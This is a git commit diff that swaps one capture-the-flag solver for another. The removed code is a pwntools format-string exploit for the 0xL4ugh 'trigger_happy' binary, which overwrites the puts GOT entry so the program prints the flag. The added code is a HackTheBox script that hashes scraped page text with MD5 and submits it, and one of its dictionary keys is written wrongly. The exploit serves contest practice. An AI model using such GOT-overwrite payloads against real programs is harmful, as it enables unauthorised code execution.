0e19eae982d585852033161024fdedd160b082cc
skyepodium <skyepodium@gmail.com>
2021-01-23 19:48:31 +0900

    hackthebox md5

--- algorithm.py
+++ algorithm.py
@@ -1,30 +1,26 @@
-# -*- coding: utf-8 -*-
-from pwn import *
+import requests
+import hashlib
+from bs4 import BeautifulSoup
 
-context.log_level = 'debug'
 
-# 1. 파일 정보를 확인한다. 32 bit, 메모리 보호 기법 없음
-e = ELF("./trigger_happy")
+url = "http://167.99.88.216:30669/"
+headers = {
+    "Content-Type": "application/x-www-form-urlencoded"
+}
+data = {
+    hash: ''
+}
 
-# 2. 파일을 분석해서 얻은 flaggy 함수와 puts함수의 주소를 받는다.
-get_flaggy = e.symbols["flaggy"]
-puts_got = e.got["puts"]
+r = requests.session()
+out = r.get(url)
+parsed_html = BeautifulSoup(out.text, "lxml")
+given_text = parsed_html.body.find('h3', attrs={'align': 'center'}).text.encode()
+print('given_text', given_text)
 
-# 3. 연결
-p = remote("ctf.0xl4ugh.com", 1337)
-
-# 4. 메시지 수신 - Do you like 0xL4ugh CTF?
-message = p.recvline().decode("utf-8")
-print(message)
-
-# 5. 포맷 스트링 공격 - 4번째를 지정하고 페이로드를 보낸다.
-payload = fmtstr_payload(4, {puts_got: get_flaggy})
-p.sendline(payload)
-
-# 6. 입력후 문자열 수신 - I am glad you
-message = p.recvline().decode("utf-8")
-print(message)
-
-# 7. flaggy 함수 에서 cat flag.txt 결과 수신
-message = p.recvall()
-print(message)
+enc = hashlib.md5()
+enc.update(given_text)
+result = enc.hexdigest()
+print("result", result)
+data["hash"] = result
+res = r.post(url, headers=headers, data=data)
+print(res.text)
